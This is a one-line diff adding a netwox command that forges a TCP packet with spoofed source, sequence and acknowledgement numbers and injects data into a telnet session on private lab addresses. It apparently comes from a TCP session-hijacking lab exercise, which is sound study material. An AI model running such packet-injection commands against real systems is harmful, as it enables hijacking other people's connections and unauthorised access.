@@ -1,0 +1,1 @@
+sudo netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 172.16.46.131 --ip4-dst 172.16.46.130 --tcp-src 53310 --tcp-dst 23 --tcp-seqnum 3913022265  --tcp-acknum 3537411119 --tcp-window 237 --tcp-data "4343"
